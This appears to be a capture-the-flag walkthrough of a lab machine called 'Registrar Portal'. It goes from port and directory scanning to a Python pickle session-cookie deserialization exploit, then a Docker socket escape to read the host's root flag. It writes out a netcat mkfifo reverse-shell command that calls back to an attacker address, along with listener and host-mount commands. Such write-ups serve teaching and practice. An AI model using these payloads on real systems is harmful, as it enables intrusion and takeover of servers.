## Reconnaissance (Network Scanning)

The first step of the engagement involved performing a comprehensive network scan using **Nmap** with the `-sCV` and `-vv` flags. 

```bash
nmap -sCV 192.168.22.81 --vv
```

![/assets/img/imgB2RR.png](/assets/img/imgB2RR.png)

The objective was to identify active services, determine their versions, and execute default NSE (Nmap Scripting Engine) scripts for initial vulnerability detection. The scan results revealed several interesting open ports:

- **Port 21 (FTP):** Running `vsftpd 3.0.5`.
- **Port 80 (HTTP):** Running a **Werkzeug 3.1.8** web server powered by **Python 3.10.12**. This is a significant finding as it indicates a Python-based web application, which often serves as a primary entry point.
- **Port 3306 (MySQL):** An open database port, although reported as unauthorized for direct access.
- **Port 8080 (HTTP):** An **Nginx 1.18.0** server, likely acting as a reverse proxy or a secondary web service.

Based on this information, the focus was shifted toward Port 80 to investigate potential web-related vulnerabilities such as Insecure Deserialization, given the Python/Werkzeug environment."

## Web Directory Enumeration

Following the initial network scan, I proceeded to perform directory brute-forcing using **Gobuster** to uncover hidden files or directories on the web server. I utilized the `common.txt` wordlist from the `dirb` directory to look for standard paths such as `/admin`, `/backup`, or `/uploads`.

```bash
gobuster dir -u http://192.168.22.81 -w /usr/share/wordlists/dirb/common.txt
```

![/assets/img/imgB2RR(1).png](/assets/img/imgB2RR(1).png)

As shown in the screenshot, the scan completed with **zero results**. This indicated that the target web application does not have common hidden directories exposed. While no new paths were discovered, this step was crucial in narrowing down the attack surface, confirming that the exploit likely resided within the main application logic or through specific parameters on the visible pages rather than through hidden directory access.

## Secondary Directory Fuzzing

To ensure that the previous Gobuster scan did not yield a false negative, I performed a secondary directory enumeration using **dirsearch**. This tool is often preferred for its recursive scanning capabilities and its distinct default wordlist, which serves as a cross-verification step in web reconnaissance.

```bash
dirsearch -u http://192.168.22.81
```

![/assets/img/imgB2RR(2).png](/assets/img/imgB2RR(2).png)

The scan was executed against the base URL `http://192.168.22.81`. However, as shown in the screenshot, the task completed without identifying any hidden directories or files. 

The consistent lack of results across multiple fuzzing tools (Gobuster and dirsearch) confirmed that the application's attack surface was not located within standard hidden paths. This directed my investigation away from directory brute-forcing and toward analyzing the application's specific functionality and input handling.

## Web Application Manual Inspection

Since directory fuzzing yielded no hidden paths, I proceeded with a manual inspection of the web interface at `http://192.168.22.81`. The page, titled 'Registrar Portal', presents a minimalist interface with no visible login or registration forms.

![/assets/img/imgB2RR(3).png](/assets/img/imgB2RR(3).png)

However, the dynamic greeting **'Welcome back, guest.'** is a significant point of interest. This suggests that the application is utilizing some form of session tracking or state management to identify the user. 

In many cases, such data is stored within **HTTP Cookies** or **Local Storage**. This observation led to the hypothesis that the 'guest' identity might be represented by a serialized object or a token, which could potentially be manipulated to escalate privileges or achieve remote code execution, especially given the previous discovery that the back-end is running on a Python/Werkzeug environment.

## Cookie Analysis and Vulnerability Identification

To investigate how the session is managed, I utilized the **Browser Developer Tools (Network Tab)** to intercept the HTTP request.

![/assets/img/imgB2RR(4).png](/assets/img/imgB2RR(4).png)

I identified a cookie named `session` with a Base64-encoded value: `gASVIQAAAAAAAAB9c...`.

Upon analyzing the encoded string, I noticed it begins with the specific prefix:

```bash
gASV
```

In technical terms, this is a known signature for a **Python Pickle object** (specifically Pickle Protocol 4) that has been Base64 encoded. The use of Pickle for session management is a high-risk implementation because it is inherently insecure.

This confirmed the presence of an **Insecure Deserialization vulnerability**. Since the application deserializes this cookie to identify the user, an attacker can craft a malicious Pickle payload, encode it in Base64, and replace the session cookie to achieve **Remote Code Execution (RCE)** on the server. This aligns with the earlier reconnaissance finding that the back-end is running on a Python/Werkzeug environment.

## Exploit Development

To exploit the identified Insecure Deserialization vulnerability, I developed a custom Python script to generate a malicious payload. The script focuses on the following key components:

![/assets/img/imgB2RR(5).png](/assets/img/imgB2RR(5).png)

- **The `__reduce__` Method:** This is a special Python 'magic method' used by the `pickle` module. When the server deserializes our object, it looks for this method to determine how to reconstruct it. By returning `os.system` and a command string, we can force the server to execute arbitrary commands during the unpickling process.
- **The Reverse Shell Command:** The payload contains a Netcat reverse shell command: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.22.77 4444 >/tmp/f`. This command creates a named pipe (FIFO) to redirect the server's shell input and output back to my attacker machine on port 4444.
- **Serialization and Encoding:** Finally, the script serializes the `RCE` class using `pickle.dumps()` and encodes the binary data into **Base64**. This ensures the payload is in the correct format to be injected into the application's session cookie.

## Generating the Malicious Payload

With the exploit script ready, I executed **`python3 registrar.py`** to generate the final Base64-encoded payload. 

![/assets/img/imgB2RR(6).png](/assets/img/imgB2RR(6).png)

As seen in the terminal, the script successfully produced a long string starting with the **`gASV`** signature. This string is the serialized 'bomb' that contains our reverse shell instructions. 

This encoded payload will be used to replace the legitimate session cookie in the next step to trigger the deserialization vulnerability on the server.

## Setting up the Listener

Before injecting the payload into the target web application, I set up a **Netcat listener** on my attacker machine (Kali Linux). I used the command **`nc -lvnp 4444`** to listen for any incoming connections on port 4444.

![/assets/img/imgB2RR(7).png](/assets/img/imgB2RR(7).png)

This listener is crucial as it acts as the 'receiver' for the reverse shell that will be initiated by the target server once it processes the malicious session cookie.

## Payload Injection and Exploit Execution

To trigger the vulnerability, I performed client-side cookie manipulation using the **Storage Inspector** in the browser's Developer Tools. I located the `session` cookie for the target domain `http://192.168.22.81` and manually replaced its original value with the malicious Base64-encoded Pickle payload generated in the previous step.

![/assets/img/imgB2RR(8).png](/assets/img/imgB2RR(8).png)

By modifying this value directly in the browser, the next request sent to the server will include the 'weaponized' session object. 

Once the page is refreshed, the server-side application will attempt to deserialize this cookie using `pickle.loads()`. 

Because the payload contains a malicious **`__reduce__`** method, the server will execute the embedded reverse shell command instead of simply loading user data, thereby granting me remote access to the system.

## Gaining Remote Access (Reverse Shell)

Immediately after refreshing the browser with the weaponized session cookie, the server executed the deserialized payload, triggering a connection back to my attacker machine. As captured in the screenshot, the **Netcat listener** on port **4444** successfully received a reverse shell from the target IP **`192.168.22.81`**.

![/assets/img/imgB2RR(9).png](/assets/img/imgB2RR(9).png)

The terminal output `/bin/sh: 0: can't access tty; job control turned off` indicates that a **non-interactive shell** has been established. Despite the lack of job control, the **`#` prompt** confirms that I have successfully gained **root-level privileges** within the container environment. This successful foothold marks the transition from external exploitation to internal post-exploitation and system enumeration.

## Post-Exploitation Enumeration and User Flag Retrieval

Once the reverse shell was established, I began a systematic enumeration of the container's filesystem to locate the user flag. Initially, I identified the application source code in the **`/app`** directory, which contained the **`app.py`** file responsible for the vulnerable Pickle implementation.

To find the flag, I navigated to the **`/home`** directory and discovered a user profile named **`appuser`**. Upon listing the contents of **`/home/appuser`**, I identified the **`user.txt`** file.

The file contained a Base64-encoded string. I used the command **`echo -n "[BASE64_STRING]" | base64 -d`** to decode the content, successfully retrieving the user flag. This confirmed that the initial objective of gaining local user access was complete.

Upon gaining an initial shell, I performed a system-wide enumeration by listing the root directory (`/`). The presence of the **`.dockerenv`** file is a critical indicator, confirming that the current environment is a virtualized **Docker container** rather than a standalone physical or virtual machine.

 I also identified an **`entrypoint.sh`** script, which typically manages the container’s startup services, and an **`/app`** directory containing the application source code.

"Executing the `ps aux` command allowed for deep process inspection. I observed that **PID 1** is occupied by `python3 app.py`, which is standard for Dockerized applications where the main service acts as the init process. 

The process list also reveals multiple active **reverse shells** and netcat (`nc`) connections, indicating the ongoing post-exploitation phase. Furthermore, the presence of `mysqld` and `nginx` suggests a multi-service architecture being managed within the container environment."

## Docker Socket Escape

![/assets/img/imgB2RR(13).png](/assets/img/imgB2RR(13).png)

After identifying that the Docker socket was accessible, I performed a **Docker Socket Escape** to escalate privileges to the host system. 

I used the command `docker run -v /:/mnt/host registrar-v2` to launch a new container that mounts the host’s entire root filesystem onto the **`/mnt/host`** directory. 

By traversing this mount point, I successfully accessed the host's protected directory and read the contents of `/root/root.txt`.
